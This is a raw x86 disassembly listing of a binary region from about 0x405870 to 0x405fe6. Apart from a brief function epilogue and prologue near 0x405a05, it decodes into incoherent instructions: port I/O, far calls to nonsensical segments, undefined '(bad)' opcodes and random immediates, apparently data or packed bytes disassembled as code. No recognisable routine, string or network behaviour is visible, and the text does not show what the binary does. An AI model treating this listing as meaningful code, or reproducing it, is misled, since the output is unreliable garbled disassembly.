  405870:	push   ebp
  405871:	add    eax,0xd245e1c5
  405876:	xchg   edi,eax
  405877:	inc    bl
  405879:	clc    
  40587a:	dec    ecx
  40587b:	stc    
  40587c:	shr    BYTE PTR [ebp-0x60],1
  40587f:	out    0xad,al
  405881:	arpl   cx,cx
  405883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405884:	jg     0x405836
  405886:	mov    al,ds:0xbfa101ed
  40588b:	sub    ebx,ebp
  40588d:	mov    al,ch
  40588f:	stc    
  405890:	inc    eax
  405891:	retf   0x79a1
  405894:	lock jbe 0x4058c2
  405897:	pop    es
  405898:	xchg   edx,eax
  405899:	or     dh,BYTE PTR [ecx]
  40589b:	stos   BYTE PTR es:[edi],al
  40589c:	jns    0x4058e2
  40589e:	pop    edi
  40589f:	sub    dl,BYTE PTR [edi+0x1eadf00b]
  4058a5:	shr    bh,cl
  4058a7:	retf   0xc502
  4058aa:	and    BYTE PTR [ebx],0xc3
  4058ad:	jmp    0xf44eeb4d
  4058b2:	add    BYTE PTR gs:[eax],dh
  4058b5:	pop    ebx
  4058b6:	xchg   edi,eax
  4058b7:	loop   0x4058bd
  4058b9:	inc    ebp
  4058ba:	inc    ecx
  4058bb:	(bad)  
  4058bc:	cmp    BYTE PTR ds:0x74735db0,cl
  4058c2:	sub    BYTE PTR [ecx-0x752ffbe],dl
  4058c8:	pop    ss
  4058c9:	popf   
  4058ca:	pusha  
  4058cb:	mov    eax,DWORD PTR [ebp-0x41]
  4058ce:	rol    ch,0x7a
  4058d1:	scas   al,BYTE PTR es:[edi]
  4058d2:	cmp    eax,0x3b5f3adf
  4058d7:	jl     0x405958
  4058d9:	stos   DWORD PTR es:[edi],eax
  4058da:	aaa    
  4058db:	stos   BYTE PTR es:[edi],al
  4058dc:	iret   
  4058dd:	out    0x50,al
  4058df:	dec    edi
  4058e0:	mov    ch,0x7b
  4058e2:	shl    BYTE PTR [edx-0x15],0x1c
  4058e6:	push   0xffffff96
  4058e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e9:	or     bl,BYTE PTR [edx-0x43b551ba]
  4058ef:	dec    edx
  4058f0:	test   eax,0x1907217c
  4058f5:	xor    edi,DWORD PTR [edi+0x5cdf59b]
  4058fb:	ficomp DWORD PTR [eax+0x44]
  4058fe:	out    dx,eax
  4058ff:	pushw  0x370f
  405903:	sbb    edx,esp
  405905:	jb     0x4058d6
  405907:	xor    eax,0x1465010d
  40590c:	lds    edx,FWORD PTR [ebp+ebp*8-0x75b31032]
  405913:	mov    bl,0xa5
  405915:	stc    
  405916:	jecxz  0x405911
  405918:	std    
  405919:	arpl   bx,si
  40591b:	dec    ebx
  40591c:	inc    ebp
  40591d:	inc    ebp
  40591e:	mov    es,WORD PTR [edi+edx*2]
  405921:	push   edx
  405922:	fdivr  QWORD PTR [eax+0x8]
  405925:	inc    edi
  405926:	add    eax,0xbf87bea
  40592b:	fwait
  40592c:	adc    ebp,ecx
  40592e:	jl     0x40595f
  405930:	int    0x7b
  405932:	jp     0x4058d1
  405934:	dec    ebp
  405935:	(bad)  
  405936:	adc    edx,ebp
  405938:	mov    esp,0xfce17c0c
  40593d:	jno    0x4059ae
  40593f:	shl    DWORD PTR ds:0x37d4041d,0x41
  405946:	jmp    0x405940
  405948:	adc    al,0x74
  40594a:	div    eax
  40594c:	sub    al,0x67
  40594e:	(bad)  
  40594f:	dec    BYTE PTR [eax]
  405951:	pop    ds
  405952:	xor    al,0x7d
  405954:	xor    cl,0x28
  405957:	icebp  
  405958:	pop    ss
  405959:	sahf   
  40595a:	ins    BYTE PTR es:[edi],dx
  40595b:	inc    ecx
  40595c:	neg    BYTE PTR [esi-0x13e01e84]
  405962:	test   BYTE PTR [eax-0x1d],cl
  405965:	mov    bh,0x34
  405967:	add    cl,BYTE PTR [ecx]
  405969:	mov    dl,0x3e
  40596b:	call   0x2ed2:0x717b7a7f
  405972:	sbb    DWORD PTR [edx],0xc0459da9
  405978:	jnp    0x4058fb
  40597a:	adc    eax,0x7d7ed38e
  40597f:	cwde   
  405980:	push   ecx
  405981:	(bad)  [esp+ecx*2-0x3c]
  405985:	icebp  
  405986:	loop   0x4059c6
  405988:	repz icebp 
  40598a:	jae    0x405931
  40598c:	xor    al,0x20
  40598e:	xchg   ebx,eax
  40598f:	rcl    BYTE PTR [ebp-0x2117fc10],0x52
  405996:	pusha  
  405997:	pop    es
  405998:	es call 0x265cb09e
  40599e:	sbb    eax,0x6e95f281
  4059a3:	sbb    al,0x8d
  4059a5:	out    0xb,eax
  4059a7:	sub    ch,bl
  4059a9:	push   ebp
  4059aa:	jl     0x405a15
  4059ac:	pushf  
  4059ad:	push   es
  4059ae:	(bad)  
  4059af:	and    edx,DWORD PTR [ecx]
  4059b1:	repz mov al,ds:0x3bc0baf0
  4059b7:	mov    DWORD PTR [ecx-0x3f55c175],eax
  4059bd:	rol    DWORD PTR [ecx+esi*2],1
  4059c0:	aam    0x60
  4059c2:	push   ss
  4059c3:	jecxz  0x405a0a
  4059c5:	test   eax,0x6d9c4b72
  4059ca:	xchg   ebp,eax
  4059cb:	lahf   
  4059cc:	aad    0x9b
  4059ce:	test   eax,0xe146e29b
  4059d3:	push   ds
  4059d4:	sbb    DWORD PTR [eax],ebp
  4059d6:	outs   dx,BYTE PTR ds:[esi]
  4059d7:	outs   dx,DWORD PTR ds:[esi]
  4059d8:	xchg   BYTE PTR [ecx],bh
  4059da:	fdivr  QWORD PTR ss:[ecx]
  4059dd:	dec    eax
  4059de:	popf   
  4059df:	push   0x72
  4059e1:	stc    
  4059e2:	out    dx,al
  4059e3:	rol    DWORD PTR [eax+0x722aebbf],1
  4059e9:	fsubr  DWORD PTR [edi+edi*2+0x35f73c94]
  4059f0:	jae    0x4059f5
  4059f2:	jne    0x405a04
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a50
  405a20:	add    cl,BYTE PTR ds:0x7838673f
  405a26:	js     0x405a75
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a67
  405a2c:	add    DWORD PTR [ecx-0xf],ecx
  405a2f:	jecxz  0x405a70
  405a31:	xchg   esp,eax
  405a32:	jl     0x405a8b
  405a34:	scas   eax,DWORD PTR es:[edi]
  405a35:	inc    edi
  405a36:	das    
  405a37:	js     0x405a51
  405a39:	in     eax,dx
  405a3a:	leave  
  405a3b:	sub    al,0x1d
  405a3d:	add    dl,dh
  405a3f:	jno    0x405abd
  405a41:	lods   al,BYTE PTR ds:[esi]
  405a42:	and    BYTE PTR gs:[esi+eax*4+0x51],ch
  405a47:	sahf   
  405a48:	xchg   ebp,eax
  405a49:	stos   DWORD PTR es:[edi],eax
  405a4a:	mov    al,0x63
  405a4c:	inc    edi
  405a4d:	push   es
  405a4e:	outs   dx,DWORD PTR ds:[esi]
  405a4f:	pop    ds
  405a50:	push   es
  405a51:	jmp    0xb0cc:0x5023428c
  405a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a59:	xchg   edx,eax
  405a5a:	adc    al,BYTE PTR [eax-0x68]
  405a5d:	or     BYTE PTR [edi-0x5e5dd492],bh
  405a63:	sahf   
  405a64:	jg     0x405a02
  405a66:	sahf   
  405a67:	xchg   esi,eax
  405a68:	xor    al,0x97
  405a6a:	push   eax
  405a6b:	gs xor eax,0x43842da8
  405a71:	js     0x405aa3
  405a73:	int    0x2d
  405a75:	jle    0x4059fe
  405a77:	ins    BYTE PTR es:[edi],dx
  405a78:	arpl   si,di
  405a7a:	adc    al,0x99
  405a7c:	outs   dx,DWORD PTR ds:[esi]
  405a7d:	add    cl,BYTE PTR [eax-0x3a4ae62d]
  405a83:	or     eax,DWORD PTR [eax+ebp*1+0x3e853f62]
  405a8a:	into   
  405a8b:	leave  
  405a8c:	es mov dh,0x80
  405a8f:	sub    edi,ebp
  405a91:	push   esp
  405a92:	inc    esi
  405a93:	mov    edi,0xa9aa56b5
  405a98:	xchg   edi,eax
  405a99:	push   0xfffffff0
  405a9b:	retf   
  405a9c:	xlat   BYTE PTR ds:[ebx]
  405a9d:	adc    al,0x4f
  405a9f:	mov    eax,ds:0x83a94dac
  405aa4:	int3   
  405aa5:	pushf  
  405aa6:	mov    BYTE PTR [edx],bh
  405aa8:	imul   ebp,eax,0x1b
  405aab:	js     0x405ab2
  405aad:	rcr    DWORD PTR [eax+0x32fdfd24],0x5b
  405ab4:	sets   BYTE PTR [esi]
  405ab7:	xchg   esp,eax
  405ab8:	test   DWORD PTR [esi+0xbcbbf18],ebx
  405abe:	xor    eax,0x3e4c5a4
  405ac3:	cmp    eax,0xaa69b668
  405ac8:	pop    edx
  405ac9:	out    dx,eax
  405aca:	sar    dh,0x41
  405acd:	inc    esi
  405ace:	les    edi,FWORD PTR [edx*1-0x64ee8b42]
  405ad5:	mov    al,ds:0xcc3ee5ae
  405ada:	js     0x405ac2
  405adc:	add    DWORD PTR [esi+0x3c],ecx
  405adf:	xchg   edi,eax
  405ae0:	jecxz  0x405b10
  405ae2:	xor    BYTE PTR [edx+0x69],bh
  405ae5:	inc    ebx
  405ae6:	cmovae esp,ecx
  405ae9:	out    dx,al
  405aea:	cs dec ebx
  405aec:	push   ebx
  405aed:	sbb    DWORD PTR [edi-0x61],esp
  405af0:	gs pop esp
  405af2:	mov    ecx,0xff346e7d
  405af7:	out    0xee,al
  405af9:	mov    ecx,0xb35ba433
  405afe:	mov    bl,0x4f
  405b00:	add    esi,ebx
  405b02:	rcl    DWORD PTR [edx+edx*2-0x6d],1
  405b06:	sub    eax,0xb9cb7395
  405b0b:	rcl    DWORD PTR [eax],1
  405b0d:	mov    dh,0x50
  405b0f:	retf   0x7a91
  405b12:	clc    
  405b13:	add    esp,DWORD PTR [edi]
  405b15:	xchg   DWORD PTR [eax],eax
  405b17:	add    edi,DWORD PTR [eax+ebp*2-0x43674fbe]
  405b1e:	or     BYTE PTR [ecx],ch
  405b20:	call   0x4cb9204d
  405b25:	push   ebx
  405b26:	xchg   edi,eax
  405b27:	xchg   DWORD PTR [ecx-0x65],ebx
  405b2a:	fbld   TBYTE PTR [ecx-0x25]
  405b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b2e:	aas    
  405b2f:	push   ecx
  405b30:	ins    BYTE PTR es:[edi],dx
  405b31:	jne    0x405aef
  405b33:	iret   
  405b34:	lods   eax,DWORD PTR ds:[esi]
  405b35:	mov    ebp,0x4633703c
  405b3a:	pop    esi
  405b3b:	aad    0xfd
  405b3d:	xchg   DWORD PTR [edx+ecx*2-0x4d],esi
  405b41:	aas    
  405b42:	shl    BYTE PTR [esi-0x7d],cl
  405b45:	pop    ebx
  405b46:	xor    DWORD PTR [edi+0x47f64c5e],0x1c70fc7
  405b50:	or     DWORD PTR [edx],edi
  405b52:	cld    
  405b53:	xchg   edx,eax
  405b54:	pop    ebp
  405b55:	dec    ebx
  405b56:	fcmovb st,st(1)
  405b58:	add    esp,ebx
  405b5a:	ds sbb al,0x52
  405b5d:	pushf  
  405b5e:	lds    edi,FWORD PTR [edx]
  405b60:	and    ch,BYTE PTR [ecx]
  405b62:	cmp    al,ch
  405b64:	sub    cl,bh
  405b66:	sar    BYTE PTR [edx+ebp*2+0x6e],1
  405b6a:	imul   ebp,DWORD PTR [eax+0x8],0xffffffe7
  405b6e:	scas   al,BYTE PTR es:[edi]
  405b6f:	test   DWORD PTR [ecx],esi
  405b71:	int    0x95
  405b73:	nop
  405b74:	arpl   ax,ax
  405b76:	repnz idiv DWORD PTR [bp+si-0x4b61]
  405b7c:	outs   dx,BYTE PTR ds:[esi]
  405b7d:	or     eax,0x3aa9e205
  405b82:	ins    BYTE PTR es:[edi],dx
  405b83:	outs   dx,BYTE PTR ds:[esi]
  405b84:	mov    bh,BYTE PTR [edx]
  405b86:	add    ecx,edi
  405b88:	imul   esp,eax,0xffffff91
  405b8b:	cwde   
  405b8c:	in     eax,dx
  405b8d:	add    ch,ch
  405b8f:	outs   dx,DWORD PTR ds:[esi]
  405b90:	call   0x7a7c:0x353737b5
  405b97:	fwait
  405b98:	outs   dx,BYTE PTR ds:[esi]
  405b99:	and    edi,DWORD PTR [ecx+eiz*2]
  405b9c:	jecxz  0x405b4f
  405b9e:	sub    dl,ah
  405ba0:	jl     0x405b43
  405ba2:	sub    bl,BYTE PTR ds:0xf4c5e2bc
  405ba8:	xlat   BYTE PTR ds:[ebx]
  405ba9:	stc    
  405baa:	and    ebx,DWORD PTR [ebp+0x4c1b0922]
  405bb0:	sbb    DWORD PTR [ebx+0x19],edi
  405bb3:	sub    al,0x8b
  405bb5:	lods   eax,DWORD PTR ds:[esi]
  405bb6:	ret    
  405bb7:	adc    BYTE PTR [edx-0x76],ah
  405bba:	out    dx,eax
  405bbb:	cwde   
  405bbc:	(bad)  
  405bbe:	jne    0x405bd0
  405bc0:	or     esi,DWORD PTR [edi]
  405bc2:	cmp    BYTE PTR [edi+0x7c],bh
  405bc5:	xchg   ebp,eax
  405bc6:	bswap  edi
  405bc8:	push   ecx
  405bc9:	(bad)  
  405bca:	sub    DWORD PTR [ebx],ebp
  405bcc:	mov    edx,0xb8f73f83
  405bd1:	add    al,0x83
  405bd3:	sti    
  405bd4:	jp     0x405c30
  405bd6:	add    al,0x6c
  405bd8:	out    0x64,eax
  405bda:	xor    ebp,DWORD PTR [ebp+0x7794accc]
  405be0:	jl     0x405be2
  405be2:	dec    edx
  405be3:	sti    
  405be4:	sbb    dl,BYTE PTR [ebp+0x13]
  405be7:	adc    edx,DWORD PTR [esi-0x7a]
  405bea:	jns    0x405bbd
  405bec:	out    dx,eax
  405bed:	sbb    esi,DWORD PTR [ebx+0x2e]
  405bf0:	es xchg esi,eax
  405bf2:	push   esp
  405bf3:	dec    esi
  405bf4:	imul   eax,DWORD PTR [eax+0x2e9ec719],0x81c60db7
  405bfe:	cmp    ch,BYTE PTR es:[esi-0x70]
  405c02:	iret   
  405c03:	sub    esp,DWORD PTR [ecx-0x491d22b8]
  405c09:	pusha  
  405c0a:	jle    0x405bb0
  405c0c:	in     al,0xa2
  405c0e:	arpl   WORD PTR [esi-0x747afc8e],si
  405c14:	jmp    DWORD PTR [ecx+0x3a666f26]
  405c1a:	ins    BYTE PTR es:[edi],dx
  405c1b:	test   al,0xb7
  405c1d:	add    DWORD PTR [ebx],0xffffffdf
  405c20:	in     al,dx
  405c21:	pop    ds
  405c22:	sbb    bh,BYTE PTR [edi+edi*1+0x71ec3066]
  405c29:	mov    BYTE PTR [edx-0x5e],cl
  405c2c:	cwde   
  405c2d:	sbb    ebp,DWORD PTR [edx+0x5a48d2b2]
  405c33:	fcmovu st,st(6)
  405c35:	and    al,0x98
  405c37:	out    0x68,al
  405c39:	jge    0x405bff
  405c3b:	cmc    
  405c3c:	add    ebx,ebp
  405c3e:	lea    esi,[edx-0x51]
  405c41:	xchg   edi,eax
  405c42:	cld    
  405c43:	in     eax,dx
  405c44:	gs test eax,0x7e369eda
  405c4a:	add    esi,DWORD PTR [ecx-0x51]
  405c4d:	fwait
  405c4e:	mov    esi,ss
  405c50:	jno    0x405c60
  405c52:	retf   0x37dd
  405c55:	fmul   DWORD PTR [edi+0x73d5468b]
  405c5b:	adc    eax,DWORD PTR [edi-0x11]
  405c5e:	xchg   esp,eax
  405c5f:	cmp    eax,0x9de47b0a
  405c64:	arpl   WORD PTR [ebx+ebp*1],dx
  405c67:	mov    edi,0xdcebd5ca
  405c6c:	arpl   WORD PTR [ebx-0x15],cx
  405c6f:	sub    DWORD PTR [edi-0x5ed19399],esp
  405c75:	and    DWORD PTR [esi+0x18],edi
  405c78:	mov    esi,0xbee5086f
  405c7d:	xchg   ebp,eax
  405c7e:	and    ch,BYTE PTR [ebp+ecx*2+0x6c]
  405c82:	scas   eax,DWORD PTR es:[edi]
  405c83:	out    dx,eax
  405c84:	ret    
  405c85:	jb     0x405d03
  405c87:	(bad)  
  405c88:	jnp    0x405c2f
  405c8a:	or     al,0xe3
  405c8c:	mov    al,ds:0x5b007a24
  405c91:	mov    ebx,0x42f6f8db
  405c96:	loope  0x405d12
  405c98:	add    al,0xb8
  405c9a:	mov    ds:0x25981bbe,eax
  405c9f:	and    DWORD PTR [eax+ecx*4+0x7b],ecx
  405ca3:	pusha  
  405ca4:	or     BYTE PTR [eax+0x43d41423],bl
  405caa:	xlat   BYTE PTR ds:[ebx]
  405cab:	enter  0x1a8c,0xc9
  405caf:	sti    
  405cb0:	(bad)  [esi+0x19]
  405cb3:	retf   
  405cb4:	push   ss
  405cb5:	div    DWORD PTR [ebx+0x3e4053f5]
  405cbb:	push   ecx
  405cbc:	jbe    0x405cce
  405cbe:	xor    al,0x35
  405cc0:	sti    
  405cc1:	cmp    eax,0x5efd6d47
  405cc6:	xchg   edi,eax
  405cc7:	lods   al,BYTE PTR ds:[esi]
  405cc8:	fidiv  WORD PTR [esi-0x39]
  405ccb:	and    BYTE PTR [edx+0x38],0xd4
  405ccf:	mov    ebp,DWORD PTR [si]
  405cd2:	xchg   esi,eax
  405cd3:	out    dx,eax
  405cd4:	daa    
  405cd5:	or     eax,0x844ef8fd
  405cda:	mov    bh,0x4
  405cdc:	inc    edi
  405cdd:	dec    ebx
  405cde:	and    eax,0xd03cdcc1
  405ce3:	jle    0x405ce3
  405ce5:	scas   eax,DWORD PTR es:[edi]
  405ce6:	or     DWORD PTR [esi+0x31d61184],0x1f
  405ced:	sbb    BYTE PTR [eax+ebp*1+0x22],0x73
  405cf2:	mov    edx,0x14eec47f
  405cf7:	cwde   
  405cf8:	cmp    BYTE PTR [eax-0x4d],dl
  405cfb:	hlt    
  405cfc:	inc    ebx
  405cfd:	jmp    0xec2a2f35
  405d02:	add    al,BYTE PTR [eax]
  405d04:	add    cl,dl
  405d06:	ret    
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xc14b4c09
  405d13:	add    al,0x93
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d5e
  405d1e:	test   DWORD PTR [bx+si-0x56a8],edi
  405d23:	je     0x405cb3
  405d25:	or     BYTE PTR ss:[eax],ah
  405d28:	and    eax,edi
  405d2a:	int    0xc8
  405d2c:	pop    esp
  405d2d:	mov    ds:0x1899b04e,al
  405d32:	xchg   edi,eax
  405d33:	sub    eax,0x102563f3
  405d38:	popa   
  405d39:	dec    edi
  405d3a:	int    0x61
  405d3c:	push   edi
  405d3d:	pop    eax
  405d3e:	shl    dh,1
  405d40:	(bad)  
  405d41:	pop    edi
  405d42:	lods   eax,DWORD PTR ds:[esi]
  405d43:	repz and eax,0xc15e0e12
  405d49:	jns    0x405dc0
  405d4b:	leave  
  405d4c:	fsub   DWORD PTR [eax-0x7a6d9096]
  405d52:	fidivr WORD PTR [edi+eiz*8-0x5a4ed942]
  405d59:	cdq    
  405d5a:	int3   
  405d5b:	push   edi
  405d5c:	xchg   ebx,eax
  405d5d:	mov    ebp,0x8adde2b0
  405d62:	nop
  405d63:	ins    DWORD PTR es:[edi],dx
  405d64:	push   esp
  405d65:	jns    0x405cec
  405d67:	sub    dl,BYTE PTR [esp+edx*4+0x230168ec]
  405d6e:	fmul   st(7),st
  405d70:	xchg   ecx,eax
  405d71:	mov    al,ds:0x411c1875
  405d76:	fsubr  DWORD PTR [edx]
  405d78:	add    DWORD PTR [eax],esi
  405d7a:	cmp    esp,DWORD PTR [ecx]
  405d7c:	xor    BYTE PTR [edi+0x12aabbd1],dh
  405d82:	xchg   esi,eax
  405d83:	xor    eax,0x5a54d928
  405d88:	xor    ebx,DWORD PTR [eax+0x11]
  405d8b:	add    eax,ebx
  405d8d:	sub    ebx,ebp
  405d8f:	ds mov dl,0xa4
  405d92:	or     DWORD PTR [eax],edx
  405d94:	shl    BYTE PTR [edx-0x45014467],cl
  405d9a:	and    al,0x8e
  405d9c:	xchg   edi,eax
  405d9d:	data16 mov dl,0xc2
  405da0:	stos   DWORD PTR es:[edi],eax
  405da1:	loopne 0x405d63
  405da3:	neg    cl
  405da5:	add    DWORD PTR [ecx],ecx
  405da7:	mov    DWORD PTR [edi],0xed8a1a3f
  405dad:	mov    ds:0x220e9437,al
  405db2:	in     eax,dx
  405db3:	and    eax,0x4aaae158
  405db8:	(bad)  
  405db9:	pop    eax
  405dba:	mov    esp,0xdf59ff39
  405dbf:	nop
  405dc0:	stc    
  405dc1:	xchg   edx,eax
  405dc2:	push   ebx
  405dc3:	jmp    0x97ac:0x11459406
  405dca:	aas    
  405dcb:	stc    
  405dcc:	push   ecx
  405dcd:	adc    al,0xe6
  405dcf:	jae    0x405d72
  405dd1:	jmp    0x405e22
  405dd3:	and    esi,DWORD PTR [edi]
  405dd5:	cmp    al,bl
  405dd7:	call   0xeb0e2de4
  405ddc:	jbe    0x405e42
  405dde:	pop    edx
  405ddf:	sbb    eax,0x5153365c
  405de4:	add    BYTE PTR [ecx-0x79],ah
  405de7:	idiv   bl
  405de9:	push   ebp
  405dea:	call   0x142e86d9
  405def:	popf   
  405df0:	push   ds
  405df1:	scas   eax,DWORD PTR es:[edi]
  405df2:	fs cwde 
  405df4:	mov    BYTE PTR [ecx],ch
  405df6:	mov    esp,fs
  405df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df9:	sbb    eax,0x4f03c52d
  405dfe:	mov    ?,WORD PTR [ebp+0x569b912b]
  405e04:	mov    ah,0x14
  405e06:	in     al,dx
  405e07:	pop    sp
  405e09:	rol    ebx,0x67
  405e0c:	mov    ch,0x1d
  405e0e:	push   0xfffffff0
  405e10:	and    al,0xc0
  405e12:	sbb    al,0x67
  405e14:	jae    0x405e8a
  405e16:	pop    ebp
  405e17:	mov    edx,0x9d79ecde
  405e1c:	mov    ah,0x10
  405e1e:	inc    edx
  405e1f:	mov    al,ch
  405e21:	xchg   ebp,eax
  405e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e23:	inc    edi
  405e24:	repnz pop ss
  405e26:	clc    
  405e27:	cmp    cl,BYTE PTR [ecx]
  405e29:	inc    eax
  405e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e2b:	ds push ds
  405e2d:	loopne 0x405e71
  405e2f:	xor    BYTE PTR [edx+0x4b6d6691],dl
  405e35:	test   BYTE PTR [esi+0x60],ah
  405e38:	or     edx,DWORD PTR [ecx+ebx*4]
  405e3b:	stos   DWORD PTR es:[edi],eax
  405e3c:	mov    dl,0xd2
  405e3e:	inc    eax
  405e3f:	adc    edi,DWORD PTR [eax+0x68]
  405e42:	inc    esp
  405e43:	pushf  
  405e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e45:	out    dx,eax
  405e46:	ins    DWORD PTR es:[edi],dx
  405e47:	in     eax,dx
  405e48:	into   
  405e49:	outs   dx,BYTE PTR ds:[esi]
  405e4a:	out    dx,al
  405e4b:	sub    al,0xd2
  405e4d:	(bad)  
  405e4e:	adc    bh,BYTE PTR [ebp+0x32]
  405e51:	xor    ebx,DWORD PTR [ebx]
  405e53:	cmp    eax,0x699cc2a6
  405e58:	xchg   ebx,eax
  405e59:	out    dx,al
  405e5a:	ror    DWORD PTR [eax+0x3c8d18eb],1
  405e60:	xchg   BYTE PTR [edx],cl
  405e62:	push   ebx
  405e63:	lock sbb al,0xc9
  405e66:	jae    0x405e0f
  405e68:	repnz mov ds:0x35e222d2,eax
  405e6e:	das    
  405e6f:	cmp    esi,DWORD PTR [edi+0x61]
  405e72:	lock daa 
  405e74:	in     eax,dx
  405e75:	aad    0x5c
  405e77:	adc    bl,BYTE PTR [eax+ebp*1-0x1f]
  405e7b:	jl     0x405e21
  405e7d:	xor    DWORD PTR [esi-0x2c],edi
  405e80:	sub    dl,BYTE PTR [esi+0x3a]
  405e83:	xor    edi,eax
  405e85:	sub    edx,ebx
  405e87:	mov    es,eax
  405e89:	push   edi
  405e8a:	ret    0x1b69
  405e8d:	in     eax,0x2c
  405e8f:	test   eax,0xdd509b93
  405e94:	push   ebx
  405e95:	pop    ebp
  405e96:	add    ch,BYTE PTR [ebp-0x5dcae035]
  405e9c:	cmp    dl,al
  405e9e:	mov    eax,0x2fd406e0
  405ea3:	xchg   esi,eax
  405ea4:	ss mov ch,bh
  405ea7:	test   al,0x88
  405ea9:	rcr    DWORD PTR [eax+0x1152469c],1
  405eaf:	mov    ebx,0x699b2305
  405eb4:	mov    cl,0xa8
  405eb6:	mov    bl,0x77
  405eb8:	ds dec edi
  405eba:	pop    eax
  405ebb:	add    eax,0xd54b20bb
  405ec0:	out    dx,eax
  405ec1:	and    al,0x89
  405ec3:	or     ch,BYTE PTR [ecx-0x46dedf02]
  405ec9:	or     ecx,DWORD PTR [ecx+0x6f]
  405ecc:	and    BYTE PTR [ecx],al
  405ece:	inc    ebp
  405ecf:	push   eax
  405ed0:	jae    0x405e7d
  405ed2:	test   DWORD PTR [ebx-0x1d],eax
  405ed5:	cmp    edi,DWORD PTR [esi+0x1ec9dbea]
  405edb:	aam    0xec
  405edd:	inc    esi
  405ede:	out    0xfd,al
  405ee0:	test   BYTE PTR [esi],bh
  405ee2:	push   ecx
  405ee3:	inc    ebp
  405ee4:	sbb    al,0xd1
  405ee6:	fs (bad) 
  405ee8:	(bad)  
  405ee9:	mov    eax,ds:0xf6f7e92a
  405eee:	pop    ebp
  405eef:	cld    
  405ef0:	mov    dl,0x25
  405ef2:	imul   ebp,DWORD PTR [eax],0x99ac9654
  405ef8:	(bad)  
  405ef9:	pop    ecx
  405efa:	push   esp
  405efb:	dec    ecx
  405efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405efd:	mov    eax,ds:0xe43a1834
  405f02:	popa   
  405f03:	add    ah,bl
  405f05:	push   ebx
  405f06:	aam    0xbb
  405f08:	inc    ebp
  405f09:	hlt    
  405f0a:	aaa    
  405f0b:	das    
  405f0c:	ins    BYTE PTR es:[edi],dx
  405f0d:	ret    
  405f0e:	adc    eax,0xdb95af85
  405f13:	sbb    BYTE PTR [ecx+0x3cf5e8bc],bl
  405f19:	jnp    0x405ece
  405f1b:	mov    al,ds:0x2794dc42
  405f20:	fs mov ebx,0x4ec20f8
  405f26:	das    
  405f27:	ret    
  405f28:	hlt    
  405f29:	jo     0x405eb5
  405f2b:	cmp    DWORD PTR [eax],ebp
  405f2d:	int    0x9d
  405f2f:	jecxz  0x405eb8
  405f31:	xor    bh,BYTE PTR [edx-0x20]
  405f34:	fwait
  405f35:	inc    ebx
  405f36:	mov    ecx,DWORD PTR [esi]
  405f38:	out    0xa5,al
  405f3a:	and    BYTE PTR [edi+0x7c4041ae],bh
  405f40:	jns    0x405f30
  405f42:	and    DWORD PTR [ebp+0x55],ecx
  405f45:	imul   ecx,DWORD PTR [ecx+0x78],0x4c
  405f49:	pop    esp
  405f4a:	inc    esi
  405f4b:	out    0xe,al
  405f4d:	and    DWORD PTR [esi+eax*1+0x7132cb90],esi
  405f54:	pop    esi
  405f55:	pop    edi
  405f56:	not    BYTE PTR [ebx-0x3fa871c2]
  405f5c:	and    cl,BYTE PTR [esi-0x28]
  405f5f:	out    dx,al
  405f60:	int3   
  405f61:	pop    es
  405f62:	into   
  405f63:	cs ss push 0xffffffb7
  405f67:	cdq    
  405f68:	sbb    edx,edi
  405f6a:	(bad)  
  405f6b:	addr16 sti 
  405f6d:	mov    edx,0x87ddd3e6
  405f72:	mov    es,eax
  405f74:	loope  0x405fe4
  405f76:	pop    ds
  405f77:	xchg   BYTE PTR [ecx+0x9],dh
  405f7a:	sub    ebx,DWORD PTR [esi-0x1dc5a82d]
  405f80:	xor    eax,0x7fb9a114
  405f85:	pop    ss
  405f86:	retf   
  405f87:	call   0x50fd2e25
  405f8c:	add    ecx,0xe7e6b5a2
  405f92:	mov    al,ds:0xfb9011af
  405f97:	push   ds
  405f98:	fisub  DWORD PTR [ebx+esi*4+0x77]
  405f9c:	push   ecx
  405f9d:	inc    edx
  405f9e:	adc    edi,DWORD PTR [edx-0x5f58458f]
  405fa4:	out    dx,eax
  405fa5:	(bad)  
  405fa6:	imul   edi,eax,0x93f4e808
  405fac:	xchg   edx,eax
  405fad:	jl     0x405fbe
  405faf:	loopne 0x405f31
  405fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb2:	xlat   BYTE PTR ds:[ebx]
  405fb3:	and    bl,bh
  405fb5:	inc    ecx
  405fb6:	pop    edx
  405fb7:	mov    eax,ds:0x856a003d
  405fbc:	(bad)  
  405fbd:	pop    ebp
  405fbe:	jecxz  0x40603b
  405fc0:	mov    ah,0x69
  405fc2:	jbe    0x405fe9
  405fc4:	jns    0x406038
  405fc6:	pop    ss
  405fc7:	mov    eax,0x16642027
  405fcc:	fcomp  DWORD PTR [eax]
  405fce:	push   edx
  405fcf:	popf   
  405fd0:	outs   dx,DWORD PTR ds:[esi]
  405fd1:	cld    
  405fd2:	(bad)  
  405fd3:	fistp  WORD PTR [edi-0x455636f1]
  405fd9:	inc    BYTE PTR [edx-0x4fa9232f]
  405fdf:	fsub   st(2),st
  405fe1:	adc    BYTE PTR [edi+0x53],ah
  405fe4:	cmp    edi,DWORD PTR [ecx]
  405fe6:	mov    dl,0x49
